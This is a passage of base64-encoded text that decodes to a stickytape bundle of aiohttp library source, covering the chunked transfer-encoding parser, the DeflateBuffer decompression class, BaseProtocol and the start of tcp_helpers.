h1bmtbcmVxdWlyZWQ6XVxyXG5cclxuICAgICAgICAjIENodW5rZWQgdHJhbnNmZXIgZW5jb2RpbmcgcGFyc2VyXHJcbiAgICAgICAgZWxpZiBzZWxmLl90eXBlID09IFBhcnNlU3RhdGUuUEFSU0VfQ0hVTktFRDpcclxuICAgICAgICAgICAgaWYgc2VsZi5fY2h1bmtfdGFpbDpcclxuICAgICAgICAgICAgICAgIGNodW5rID0gc2VsZi5fY2h1bmtfdGFpbCArIGNodW5rXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jaHVua190YWlsID0gYiIiXHJcblxyXG4gICAgICAgICAgICB3aGlsZSBjaHVuazpcclxuXHJcbiAgICAgICAgICAgICAgICAjIHJlYWQgbmV4dCBjaHVuayBzaXplXHJcbiAgICAgICAgICAgICAgICBpZiBzZWxmLl9jaHVuayA9PSBDaHVua1N0YXRlLlBBUlNFX0NIVU5LRURfU0laRTpcclxuICAgICAgICAgICAgICAgICAgICBwb3MgPSBjaHVuay5maW5kKFNFUClcclxuICAgICAgICAgICAgICAgICAgICBpZiBwb3MgPj0gMDpcclxuICAgICAgICAgICAgICAgICAgICAgICAgaSA9IGNodW5rLmZpbmQoQ0hVTktfRVhULCAwLCBwb3MpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGkgPj0gMDpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNpemVfYiA9IGNodW5rWzppXSAgIyBzdHJpcCBjaHVuay1leHRlbnNpb25zXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaXplX2IgPSBjaHVua1s6cG9zXVxyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2l6ZSA9IGludChieXRlcyhzaXplX2IpLCAxNilcclxuICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGMgPSBUcmFuc2ZlckVuY29kaW5nRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtbOnBvc10uZGVjb2RlKCJhc2NpaSIsICJzdXJyb2dhdGVlc2NhcGUiKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5wYXlsb2FkLnNldF9leGNlcHRpb24oZXhjKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgZXhjIGZyb20gTm9uZVxyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmsgPSBjaHVua1twb3MgKyAyIDpdXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNpemUgPT0gMDogICMgZW9mIG1hcmtlclxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5fY2h1bmsgPSBDaHVua1N0YXRlLlBBUlNFX01BWUJFX1RSQUlMRVJTXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl9jaHVuayA9IENodW5rU3RhdGUuUEFSU0VfQ0hVTktFRF9DSFVOS1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5fY2h1bmtfc2l6ZSA9IHNpemVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucGF5bG9hZC5iZWdpbl9odHRwX2NodW5rX3JlY2VpdmluZygpXHJcbiAgICAgICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5fY2h1bmtfdGFpbCA9IGNodW5rXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZSwgYiIiXHJcblxyXG4gICAgICAgICAgICAgICAgIyByZWFkIGNodW5rIGFuZCBmZWVkIGJ1ZmZlclxyXG4gICAgICAgICAgICAgICAgaWYgc2VsZi5fY2h1bmsgPT0gQ2h1bmtTdGF0ZS5QQVJTRV9DSFVOS0VEX0NIVU5LOlxyXG4gICAgICAgICAgICAgICAgICAgIHJlcXVpcmVkID0gc2VsZi5fY2h1bmtfc2l6ZVxyXG4gICAgICAgICAgICAgICAgICAgIGNodW5rX2xlbiA9IGxlbihjaHVuaylcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgcmVxdWlyZWQgPiBjaHVua19sZW46XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuX2NodW5rX3NpemUgPSByZXF1aXJlZCAtIGNodW5rX2xlblxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnBheWxvYWQuZmVlZF9kYXRhKGNodW5rLCBjaHVua19sZW4pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZSwgYiIiXHJcbiAgICAgICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5fY2h1bmtfc2l6ZSA9IDBcclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5wYXlsb2FkLmZlZWRfZGF0YShjaHVua1s6cmVxdWlyZWRdLCByZXF1aXJlZClcclxuICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmsgPSBjaHVua1tyZXF1aXJlZDpdXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuX2NodW5rID0gQ2h1bmtTdGF0ZS5QQVJTRV9DSFVOS0VEX0NIVU5LX0VPRlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnBheWxvYWQuZW5kX2h0dHBfY2h1bmtfcmVjZWl2aW5nKClcclxuXHJcbiAgICAgICAgICAgICAgICAjIHRvc3MgdGhlIENSTEYgYXQgdGhlIGVuZCBvZiB0aGUgY2h1bmtcclxuICAgICAgICAgICAgICAgIGlmIHNlbGYuX2NodW5rID09IENodW5rU3RhdGUuUEFSU0VfQ0hVTktFRF9DSFVOS19FT0Y6XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgY2h1bmtbOjJdID09IFNFUDpcclxuICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmsgPSBjaHVua1syOl1cclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5fY2h1bmsgPSBDaHVua1N0YXRlLlBBUlNFX0NIVU5LRURfU0laRVxyXG4gICAgICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuX2NodW5rX3RhaWwgPSBjaHVua1xyXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gRmFsc2UsIGIiIlxyXG5cclxuICAgICAgICAgICAgICAgICMgaWYgc3RyZWFtIGRvZXMgbm90IGNvbnRhaW4gdHJhaWxlciwgYWZ0ZXIgMFxcclxcblxyXG4gICAgICAgICAgICAgICAgIyB3ZSBzaG91bGQgZ2V0IGFub3RoZXIgXFxyXFxuIG90aGVyd2lzZVxyXG4gICAgICAgICAgICAgICAgIyB0cmFpbGVycyBuZWVkcyB0byBiZSBza2lwZWQgdW50aWwgXFxyXFxuXFxyXFxuXHJcbiAgICAgICAgICAgICAgICBpZiBzZWxmLl9jaHVuayA9PSBDaHVua1N0YXRlLlBBUlNFX01BWUJFX1RSQUlMRVJTOlxyXG4gICAgICAgICAgICAgICAgICAgIGhlYWQgPSBjaHVua1s6Ml1cclxuICAgICAgICAgICAgICAgICAgICBpZiBoZWFkID09IFNFUDpcclxuICAgICAgICAgICAgICAgICAgICAgICAgIyBlbmQgb2Ygc3RyZWFtXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucGF5bG9hZC5mZWVkX2VvZigpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBUcnVlLCBjaHVua1syOl1cclxuICAgICAgICAgICAgICAgICAgICAjIEJvdGggQ1IgYW5kIExGLCBvciBvbmx5IExGIG1heSBub3QgYmUgcmVjZWl2ZWQgeWV0LiBJdCBpc1xyXG4gICAgICAgICAgICAgICAgICAgICMgZXhwZWN0ZWQgdGhhdCBDUkxGIG9yIExGIHdpbGwgYmUgc2hvd24gYXQgdGhlIHZlcnkgZmlyc3RcclxuICAgICAgICAgICAgICAgICAgICAjIGJ5dGUgbmV4dCB0aW1lLCBvdGhlcndpc2UgdHJhaWxlcnMgc2hvdWxkIGNvbWUuIFRoZSBsYXN0XHJcbiAgICAgICAgICAgICAgICAgICAgIyBDUkxGIHdoaWNoIG1hcmtzIHRoZSBlbmQgb2YgcmVzcG9uc2UgbWlnaHQgbm90IGJlXHJcbiAgICAgICAgICAgICAgICAgICAgIyBjb250YWluZWQgaW4gdGhlIHNhbWUgVENQIHNlZ21lbnQgd2hpY2ggZGVsaXZlcmVkIHRoZVxyXG4gICAgICAgICAgICAgICAgICAgICMgc2l6ZSBpbmRpY2F0b3IuXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGhlYWQ6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZSwgYiIiXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgaGVhZCA9PSBTRVBbOjFdOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl9jaHVua190YWlsID0gaGVhZFxyXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gRmFsc2UsIGIiIlxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX2NodW5rID0gQ2h1bmtTdGF0ZS5QQVJTRV9UUkFJTEVSU1xyXG5cclxuICAgICAgICAgICAgICAgICMgcmVhZCBhbmQgZGlzY2FyZCB0cmFpbGVyIHVwIHRvIHRoZSBDUkxGIHRlcm1pbmF0b3JcclxuICAgICAgICAgICAgICAgIGlmIHNlbGYuX2NodW5rID09IENodW5rU3RhdGUuUEFSU0VfVFJBSUxFUlM6XHJcbiAgICAgICAgICAgICAgICAgICAgcG9zID0gY2h1bmsuZmluZChTRVApXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgcG9zID49IDA6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rID0gY2h1bmtbcG9zICsgMiA6XVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl9jaHVuayA9IENodW5rU3RhdGUuUEFSU0VfTUFZQkVfVFJBSUxFUlNcclxuICAgICAgICAgICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl9jaHVua190YWlsID0gY2h1bmtcclxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlLCBiIiJcclxuXHJcbiAgICAgICAgIyBSZWFkIGFsbCBieXRlcyB1bnRpbCBlb2ZcclxuICAgICAgICBlbGlmIHNlbGYuX3R5cGUgPT0gUGFyc2VTdGF0ZS5QQVJTRV9VTlRJTF9FT0Y6XHJcbiAgICAgICAgICAgIHNlbGYucGF5bG9hZC5mZWVkX2RhdGEoY2h1bmssIGxlbihjaHVuaykpXHJcblxyXG4gICAgICAgIHJldHVybiBGYWxzZSwgYiIiXHJcblxyXG5cclxuY2xhc3MgRGVmbGF0ZUJ1ZmZlcjpcclxuICAgICIiIkRlZmxhdGVTdHJlYW0gZGVjb21wcmVzcyBzdHJlYW0gYW5kIGZlZWQgZGF0YSBpbnRvIHNwZWNpZmllZCBzdHJlYW0uIiIiXHJcblxyXG4gICAgZGVjb21wcmVzc29yOiBBbnlcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgb3V0OiBTdHJlYW1SZWFkZXIsIGVuY29kaW5nOiBPcHRpb25hbFtzdHJdKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYub3V0ID0gb3V0XHJcbiAgICAgICAgc2VsZi5zaXplID0gMFxyXG4gICAgICAgIHNlbGYuZW5jb2RpbmcgPSBlbmNvZGluZ1xyXG4gICAgICAgIHNlbGYuX3N0YXJ0ZWRfZGVjb2RpbmcgPSBGYWxzZVxyXG5cclxuICAgICAgICBpZiBlbmNvZGluZyA9PSAiYnIiOlxyXG4gICAgICAgICAgICBpZiBub3QgSEFTX0JST1RMSTogICMgcHJhZ21hOiBubyBjb3ZlclxyXG4gICAgICAgICAgICAgICAgcmFpc2UgQ29udGVudEVuY29kaW5nRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgIkNhbiBub3QgZGVjb2RlIGNvbnRlbnQtZW5jb2Rpbmc6IGJyb3RsaSAoYnIpLiAiXHJcbiAgICAgICAgICAgICAgICAgICAgIlBsZWFzZSBpbnN0YWxsIGBCcm90bGlgIlxyXG4gICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAgICAgY2xhc3MgQnJvdGxpRGVjb2RlcjpcclxuICAgICAgICAgICAgICAgICMgU3VwcG9ydHMgYm90aCBcJ2Jyb3RsaXB5XCcgYW5kIFwnQnJvdGxpXCcgcGFja2FnZXNcclxuICAgICAgICAgICAgICAgICMgc2luY2UgdGhleSBzaGFyZSBhbiBpbXBvcnQgbmFtZS4gVGhlIHRvcCBicmFuY2hlc1xyXG4gICAgICAgICAgICAgICAgIyBhcmUgZm9yIFwnYnJvdGxpcHlcJyBhbmQgYm90dG9tIGJyYW5jaGVzIGZvciBcJ0Jyb3RsaVwnXHJcbiAgICAgICAgICAgICAgICBkZWYgX19pbml0X18oc2VsZikgLT4gTm9uZTpcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9vYmogPSBicm90bGkuRGVjb21wcmVzc29yKClcclxuXHJcbiAgICAgICAgICAgICAgICBkZWYgZGVjb21wcmVzcyhzZWxmLCBkYXRhOiBieXRlcykgLT4gYnl0ZXM6XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgaGFzYXR0cihzZWxmLl9vYmosICJkZWNvbXByZXNzIik6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBjYXN0KGJ5dGVzLCBzZWxmLl9vYmouZGVjb21wcmVzcyhkYXRhKSlcclxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gY2FzdChieXRlcywgc2VsZi5fb2JqLnByb2Nlc3MoZGF0YSkpXHJcblxyXG4gICAgICAgICAgICAgICAgZGVmIGZsdXNoKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgICAgICAgICAgICAgIGlmIGhhc2F0dHIoc2VsZi5fb2JqLCAiZmx1c2giKTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGNhc3QoYnl0ZXMsIHNlbGYuX29iai5mbHVzaCgpKVxyXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBiIiJcclxuXHJcbiAgICAgICAgICAgIHNlbGYuZGVjb21wcmVzc29yID0gQnJvdGxpRGVjb2RlcigpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgemxpYl9tb2RlID0gMTYgKyB6bGliLk1BWF9XQklUUyBpZiBlbmNvZGluZyA9PSAiZ3ppcCIgZWxzZSB6bGliLk1BWF9XQklUU1xyXG4gICAgICAgICAgICBzZWxmLmRlY29tcHJlc3NvciA9IHpsaWIuZGVjb21wcmVzc29iaih3Yml0cz16bGliX21vZGUpXHJcblxyXG4gICAgZGVmIHNldF9leGNlcHRpb24oc2VsZiwgZXhjOiBCYXNlRXhjZXB0aW9uKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYub3V0LnNldF9leGNlcHRpb24oZXhjKVxyXG5cclxuICAgIGRlZiBmZWVkX2RhdGEoc2VsZiwgY2h1bms6IGJ5dGVzLCBzaXplOiBpbnQpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IHNpemU6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICBzZWxmLnNpemUgKz0gc2l6ZVxyXG5cclxuICAgICAgICAjIFJGQzE5NTBcclxuICAgICAgICAjIGJpdHMgMC4uMyA9IENNID0gMGIxMDAwID0gOCA9ICJkZWZsYXRlIlxyXG4gICAgICAgICMgYml0cyA0Li43ID0gQ0lORk8gPSAxLi43ID0gd2luZG93cyBzaXplLlxyXG4gICAgICAgIGlmIChcclxuICAgICAgICAgICAgbm90IHNlbGYuX3N0YXJ0ZWRfZGVjb2RpbmdcclxuICAgICAgICAgICAgYW5kIHNlbGYuZW5jb2RpbmcgPT0gImRlZmxhdGUiXHJcbiAgICAgICAgICAgIGFuZCBjaHVua1swXSAmIDB4RiAhPSA4XHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgIyBDaGFuZ2UgdGhlIGRlY29kZXIgdG8gZGVjb21wcmVzcyBpbmNvcnJlY3RseSBjb21wcmVzc2VkIGRhdGFcclxuICAgICAgICAgICAgIyBBY3R1YWxseSB3ZSBzaG91bGQgaXNzdWUgYSB3YXJuaW5nIGFib3V0IG5vbi1SRkMtY29tcGxpYW50IGRhdGEuXHJcbiAgICAgICAgICAgIHNlbGYuZGVjb21wcmVzc29yID0gemxpYi5kZWNvbXByZXNzb2JqKHdiaXRzPS16bGliLk1BWF9XQklUUylcclxuXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBjaHVuayA9IHNlbGYuZGVjb21wcmVzc29yLmRlY29tcHJlc3MoY2h1bmspXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjpcclxuICAgICAgICAgICAgcmFpc2UgQ29udGVudEVuY29kaW5nRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiQ2FuIG5vdCBkZWNvZGUgY29udGVudC1lbmNvZGluZzogJXMiICUgc2VsZi5lbmNvZGluZ1xyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX3N0YXJ0ZWRfZGVjb2RpbmcgPSBUcnVlXHJcblxyXG4gICAgICAgIGlmIGNodW5rOlxyXG4gICAgICAgICAgICBzZWxmLm91dC5mZWVkX2RhdGEoY2h1bmssIGxlbihjaHVuaykpXHJcblxyXG4gICAgZGVmIGZlZWRfZW9mKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgY2h1bmsgPSBzZWxmLmRlY29tcHJlc3Nvci5mbHVzaCgpXHJcblxyXG4gICAgICAgIGlmIGNodW5rIG9yIHNlbGYuc2l6ZSA+IDA6XHJcbiAgICAgICAgICAgIHNlbGYub3V0LmZlZWRfZGF0YShjaHVuaywgbGVuKGNodW5rKSlcclxuICAgICAgICAgICAgaWYgc2VsZi5lbmNvZGluZyA9PSAiZGVmbGF0ZSIgYW5kIG5vdCBzZWxmLmRlY29tcHJlc3Nvci5lb2Y6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBDb250ZW50RW5jb2RpbmdFcnJvcigiZGVmbGF0ZSIpXHJcblxyXG4gICAgICAgIHNlbGYub3V0LmZlZWRfZW9mKClcclxuXHJcbiAgICBkZWYgYmVnaW5faHR0cF9jaHVua19yZWNlaXZpbmcoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLm91dC5iZWdpbl9odHRwX2NodW5rX3JlY2VpdmluZygpXHJcblxyXG4gICAgZGVmIGVuZF9odHRwX2NodW5rX3JlY2VpdmluZyhzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYub3V0LmVuZF9odHRwX2NodW5rX3JlY2VpdmluZygpXHJcblxyXG5cclxuSHR0cFJlcXVlc3RQYXJzZXJQeSA9IEh0dHBSZXF1ZXN0UGFyc2VyXHJcbkh0dHBSZXNwb25zZVBhcnNlclB5ID0gSHR0cFJlc3BvbnNlUGFyc2VyXHJcblJhd1JlcXVlc3RNZXNzYWdlUHkgPSBSYXdSZXF1ZXN0TWVzc2FnZVxyXG5SYXdSZXNwb25zZU1lc3NhZ2VQeSA9IFJhd1Jlc3BvbnNlTWVzc2FnZVxyXG5cclxudHJ5OlxyXG4gICAgaWYgbm90IE5PX0VYVEVOU0lPTlM6XHJcbiAgICAgICAgZnJvbSAuX2h0dHBfcGFyc2VyIGltcG9ydCAoICAjIHR5cGU6IGlnbm9yZVtpbXBvcnQsbm8tcmVkZWZdXHJcbiAgICAgICAgICAgIEh0dHBSZXF1ZXN0UGFyc2VyLFxyXG4gICAgICAgICAgICBIdHRwUmVzcG9uc2VQYXJzZXIsXHJcbiAgICAgICAgICAgIFJhd1JlcXVlc3RNZXNzYWdlLFxyXG4gICAgICAgICAgICBSYXdSZXNwb25zZU1lc3NhZ2UsXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICBIdHRwUmVxdWVzdFBhcnNlckMgPSBIdHRwUmVxdWVzdFBhcnNlclxyXG4gICAgICAgIEh0dHBSZXNwb25zZVBhcnNlckMgPSBIdHRwUmVzcG9uc2VQYXJzZXJcclxuICAgICAgICBSYXdSZXF1ZXN0TWVzc2FnZUMgPSBSYXdSZXF1ZXN0TWVzc2FnZVxyXG4gICAgICAgIFJhd1Jlc3BvbnNlTWVzc2FnZUMgPSBSYXdSZXNwb25zZU1lc3NhZ2VcclxuZXhjZXB0IEltcG9ydEVycm9yOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICBwYXNzXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9odHRwL2Jhc2VfcHJvdG9jb2wucHknLCBiJ2ltcG9ydCBhc3luY2lvXHJcbmZyb20gdHlwaW5nIGltcG9ydCBPcHRpb25hbCwgY2FzdFxyXG5cclxuZnJvbSAudGNwX2hlbHBlcnMgaW1wb3J0IHRjcF9ub2RlbGF5XHJcblxyXG5cclxuY2xhc3MgQmFzZVByb3RvY29sKGFzeW5jaW8uUHJvdG9jb2wpOlxyXG4gICAgX19zbG90c19fID0gKFxyXG4gICAgICAgICJfbG9vcCIsXHJcbiAgICAgICAgIl9wYXVzZWQiLFxyXG4gICAgICAgICJfZHJhaW5fd2FpdGVyIixcclxuICAgICAgICAiX2Nvbm5lY3Rpb25fbG9zdCIsXHJcbiAgICAgICAgIl9yZWFkaW5nX3BhdXNlZCIsXHJcbiAgICAgICAgInRyYW5zcG9ydCIsXHJcbiAgICApXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGxvb3A6IGFzeW5jaW8uQWJzdHJhY3RFdmVudExvb3ApIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fbG9vcCA9IGxvb3AgICMgdHlwZTogYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcFxyXG4gICAgICAgIHNlbGYuX3BhdXNlZCA9IEZhbHNlXHJcbiAgICAgICAgc2VsZi5fZHJhaW5fd2FpdGVyID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFthc3luY2lvLkZ1dHVyZVtOb25lXV1cclxuICAgICAgICBzZWxmLl9jb25uZWN0aW9uX2xvc3QgPSBGYWxzZVxyXG4gICAgICAgIHNlbGYuX3JlYWRpbmdfcGF1c2VkID0gRmFsc2VcclxuXHJcbiAgICAgICAgc2VsZi50cmFuc3BvcnQgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW2FzeW5jaW8uVHJhbnNwb3J0XVxyXG5cclxuICAgIGRlZiBwYXVzZV93cml0aW5nKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgYXNzZXJ0IG5vdCBzZWxmLl9wYXVzZWRcclxuICAgICAgICBzZWxmLl9wYXVzZWQgPSBUcnVlXHJcblxyXG4gICAgZGVmIHJlc3VtZV93cml0aW5nKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgYXNzZXJ0IHNlbGYuX3BhdXNlZFxyXG4gICAgICAgIHNlbGYuX3BhdXNlZCA9IEZhbHNlXHJcblxyXG4gICAgICAgIHdhaXRlciA9IHNlbGYuX2RyYWluX3dhaXRlclxyXG4gICAgICAgIGlmIHdhaXRlciBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5fZHJhaW5fd2FpdGVyID0gTm9uZVxyXG4gICAgICAgICAgICBpZiBub3Qgd2FpdGVyLmRvbmUoKTpcclxuICAgICAgICAgICAgICAgIHdhaXRlci5zZXRfcmVzdWx0KE5vbmUpXHJcblxyXG4gICAgZGVmIHBhdXNlX3JlYWRpbmcoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3Qgc2VsZi5fcmVhZGluZ19wYXVzZWQgYW5kIHNlbGYudHJhbnNwb3J0IGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICBzZWxmLnRyYW5zcG9ydC5wYXVzZV9yZWFkaW5nKClcclxuICAgICAgICAgICAgZXhjZXB0IChBdHRyaWJ1dGVFcnJvciwgTm90SW1wbGVtZW50ZWRFcnJvciwgUnVudGltZUVycm9yKTpcclxuICAgICAgICAgICAgICAgIHBhc3NcclxuICAgICAgICAgICAgc2VsZi5fcmVhZGluZ19wYXVzZWQgPSBUcnVlXHJcblxyXG4gICAgZGVmIHJlc3VtZV9yZWFkaW5nKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fcmVhZGluZ19wYXVzZWQgYW5kIHNlbGYudHJhbnNwb3J0IGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICBzZWxmLnRyYW5zcG9ydC5yZXN1bWVfcmVhZGluZygpXHJcbiAgICAgICAgICAgIGV4Y2VwdCAoQXR0cmlidXRlRXJyb3IsIE5vdEltcGxlbWVudGVkRXJyb3IsIFJ1bnRpbWVFcnJvcik6XHJcbiAgICAgICAgICAgICAgICBwYXNzXHJcbiAgICAgICAgICAgIHNlbGYuX3JlYWRpbmdfcGF1c2VkID0gRmFsc2VcclxuXHJcbiAgICBkZWYgY29ubmVjdGlvbl9tYWRlKHNlbGYsIHRyYW5zcG9ydDogYXN5bmNpby5CYXNlVHJhbnNwb3J0KSAtPiBOb25lOlxyXG4gICAgICAgIHRyID0gY2FzdChhc3luY2lvLlRyYW5zcG9ydCwgdHJhbnNwb3J0KVxyXG4gICAgICAgIHRjcF9ub2RlbGF5KHRyLCBUcnVlKVxyXG4gICAgICAgIHNlbGYudHJhbnNwb3J0ID0gdHJcclxuXHJcbiAgICBkZWYgY29ubmVjdGlvbl9sb3N0KHNlbGYsIGV4YzogT3B0aW9uYWxbQmFzZUV4Y2VwdGlvbl0pIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fY29ubmVjdGlvbl9sb3N0ID0gVHJ1ZVxyXG4gICAgICAgICMgV2FrZSB1cCB0aGUgd3JpdGVyIGlmIGN1cnJlbnRseSBwYXVzZWQuXHJcbiAgICAgICAgc2VsZi50cmFuc3BvcnQgPSBOb25lXHJcbiAgICAgICAgaWYgbm90IHNlbGYuX3BhdXNlZDpcclxuICAgICAgICAgICAgcmV0dXJuXHJcbiAgICAgICAgd2FpdGVyID0gc2VsZi5fZHJhaW5fd2FpdGVyXHJcbiAgICAgICAgaWYgd2FpdGVyIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG4gICAgICAgIHNlbGYuX2RyYWluX3dhaXRlciA9IE5vbmVcclxuICAgICAgICBpZiB3YWl0ZXIuZG9uZSgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuICAgICAgICBpZiBleGMgaXMgTm9uZTpcclxuICAgICAgICAgICAgd2FpdGVyLnNldF9yZXN1bHQoTm9uZSlcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICB3YWl0ZXIuc2V0X2V4Y2VwdGlvbihleGMpXHJcblxyXG4gICAgYXN5bmMgZGVmIF9kcmFpbl9oZWxwZXIoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl9jb25uZWN0aW9uX2xvc3Q6XHJcbiAgICAgICAgICAgIHJhaXNlIENvbm5lY3Rpb25SZXNldEVycm9yKCJDb25uZWN0aW9uIGxvc3QiKVxyXG4gICAgICAgIGlmIG5vdCBzZWxmLl9wYXVzZWQ6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG4gICAgICAgIHdhaXRlciA9IHNlbGYuX2RyYWluX3dhaXRlclxyXG4gICAgICAgIGlmIHdhaXRlciBpcyBOb25lOlxyXG4gICAgICAgICAgICB3YWl0ZXIgPSBzZWxmLl9sb29wLmNyZWF0ZV9mdXR1cmUoKVxyXG4gICAgICAgICAgICBzZWxmLl9kcmFpbl93YWl0ZXIgPSB3YWl0ZXJcclxuICAgICAgICBhd2FpdCBhc3luY2lvLnNoaWVsZCh3YWl0ZXIpXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9odHRwL3RjcF9oZWxwZXJzLnB5JywgYiciIiJIZWxwZXIgbWV0aG9kcyB0byB0dW5lIGEgVENQIGNvbm5lY3Rpb24iIiJcclxuXHJcbmltcG9ydCBhc3luY2lvXHJcbmltcG9ydCBzb2NrZXRcclxuZnJvbSBjb250ZXh0bGliIGltcG9ydCBzdXBwcmVzc1xyXG5mcm9tIHR5cGluZyBpbXBvcnQgT3B0aW9uYWwgICMgbm9xYVxyXG5cclxuX19hbGxfXyA9ICgidGNwX2tlZXBhbGl2ZSIsICJ0Y3Bfbm9kZWxheSIpXHJcblxyXG5cclxuaWYgaGFzYXR0cihzb2NrZXQsICJTT19LRUVQQUxJVkUiKTpcclxuXHJcbiAgICBkZWYgdGNwX2tlZXBhbGl2ZSh0cmFuc3BvcnQ6IGFzeW5jaW8uVHJhbnNwb3J0KSAtPiBOb25lOlxyXG4gICAgICAgIHNvY2sgPSB0cmFuc3BvcnQuZ2V0X2V4dHJhX2luZm8oInNvY2tldCIpXHJcbiAgICAgICAgaWYgc29jayBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc29jay5z